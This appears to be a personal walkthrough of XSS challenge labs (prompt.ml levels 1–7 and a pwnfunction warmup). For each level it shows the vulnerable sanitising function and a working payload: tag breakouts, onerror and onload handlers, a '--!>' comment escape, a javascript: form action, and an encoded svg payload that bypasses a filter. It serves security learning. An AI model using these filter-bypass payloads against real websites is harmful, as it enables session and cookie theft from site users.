Lab link: https://prompt.ml/

1)"><script>alert(document.cookie)</script>

2) function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}    

To escape from article it is not letting js code we can inject :</article><img src=x onerror=alert(1)

3) In this lab ) is being escaped by the server so we can use:<script>alert`401`</script>
4)Lets see the function :function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}     
This function is made to escape or comment out the tags or anything inside the input so we can escape using --!> as it is rejecting -->
Payload:--!><script>alert(1)</script

5) hello" type=image src=x onerror
="alert(1)
For code interpreted as : <input value="hello" type=image src=x onerror
="alert(1)" type="text">

6) https://prompt.ml/6
This lab is based on basic example of dom clobering concept:

function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}        

 Payload use: javascript:alert(document.domain)#{"action":"Matt"}
 Interpreted code :
 
 <form action="javascript:alert(document.domain)" method="post"><input name="action" value="Matt"></form>                         
<script>                                                  
    // forbid javascript: or vbscript: and data: stuff    
    if (!/script:|data:/i.test(document.forms[0].action)) 
        document.forms[0].submit();                       
    else                                                  
        document.write("Action forbidden.")               
</script>                                                
        
7) Code:
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
} 

Character are limited to 12 only and allowed # as input. 
Payload can be created using # which is allowed atq code.
Payload: "><svg/a=#"onload='/*#*/alert(1)' 
In this case closing onload with '' seems good option to get xss trigerred. 


XSS bypassing techniques from lab;
Lab link :https://xss.pwnfunction.com/warmups/thats-hawt/

 <script>
        smith = (new URL(location).searchParams.get('markassbrownlee') || "Ah That's Hawt")
        smith = smith.replace(/[\(\`\)\\]/g, '')
        will.innerHTML = smith
    </script>

    Here we can see all those restriction and we have to bypass it: 
    This payload in the url:
     https://sandbox.pwnfunction.com/warmups/thats-hawt.html?markassbrownlee=<script>alert(1)<script>

Is converted to : alert1 where () is rejected as of regex restriction/filtered provided by backend logic to prevent from xss attack.
Soliution is to html encode to alert(1) then url encode it : as given below:
<!-- URL Encoding + HTML Entity Encoding -->
%3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E

<!-- HTML Entity Encoding -->
<svg onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x33;&#x33;&#x37;&#x29;">

<!-- No Encoding -->
<svg onload="alert(1337)">


